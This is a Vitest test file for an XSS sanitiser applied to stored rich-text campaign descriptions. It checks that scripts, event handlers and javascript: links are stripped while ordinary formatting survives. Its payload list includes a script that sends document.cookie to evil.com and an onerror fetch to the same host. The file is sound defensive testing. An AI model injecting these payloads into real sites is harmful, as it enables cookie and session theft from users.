import { describe, it, expect } from 'vitest'
import { sanitizeRichText } from '@/lib/sanitize'

describe('sanitizeRichText (XSS defence for stored rich text)', () => {
  it('strips <script> tags entirely', () => {
    const out = sanitizeRichText('<p>Hi</p><script>alert(1)</script>')
    expect(out).not.toContain('<script')
    expect(out).not.toContain('alert(1)')
    expect(out).toContain('<p>Hi</p>')
  })

  it('strips inline event handlers', () => {
    const out = sanitizeRichText('<p onclick="steal()">click</p>')
    expect(out).not.toContain('onclick')
    expect(out).toContain('click')
  })

  it('strips javascript: URLs on links', () => {
    const out = sanitizeRichText('<a href="javascript:evil()">x</a>')
    expect(out.toLowerCase()).not.toContain('javascript:')
  })

  it('keeps allowed formatting tags', () => {
    const html = '<p><strong>bold</strong> <em>italic</em></p><ul><li>item</li></ul>'
    const out = sanitizeRichText(html)
    expect(out).toContain('<strong>bold</strong>')
    expect(out).toContain('<em>italic</em>')
    expect(out).toContain('<li>item</li>')
  })

  it('forces rel="noopener noreferrer" on links that survive', () => {
    const out = sanitizeRichText('<a href="https://example.com">safe</a>')
    expect(out).toContain('href="https://example.com"')
    expect(out).toContain('noopener')
  })

  // Campaign opportunityDescription is rendered with dangerouslySetInnerHTML,
  // and the CSP allows 'unsafe-inline' for scripts — so anything stored raw
  // would execute for every member. These are the exact payloads a
  // compromised admin could try (the C1 finding).
  describe('stored-XSS payloads in campaign descriptions', () => {
    const payloads = [
      '<script>fetch("https://evil.com?c="+document.cookie)</script>',
      '<img src=x onerror="fetch(\'https://evil.com\')">',
      '<svg/onload=alert(1)>',
      '<iframe src="javascript:alert(1)"></iframe>',
      '<body onload=alert(1)>',
      '<a href="javascript:alert(1)">click me</a>',
    ]

    it.each(payloads)('neutralises: %s', (payload) => {
      const out = sanitizeRichText(payload)
      expect(out).not.toMatch(/<script/i)
      expect(out).not.toMatch(/<iframe/i)
      expect(out).not.toMatch(/onerror=/i)
      expect(out).not.toMatch(/onload=/i)
      expect(out.toLowerCase()).not.toContain('javascript:')
    })

    it('keeps the legitimate formatting an admin would actually write', () => {
      const real = '<p>Gifted <strong>skincare</strong> bundle.</p><ul><li>1 x Reel</li></ul>'
      const out = sanitizeRichText(real)
      expect(out).toContain('<strong>skincare</strong>')
      expect(out).toContain('<li>1 x Reel</li>')
    })
  })
})
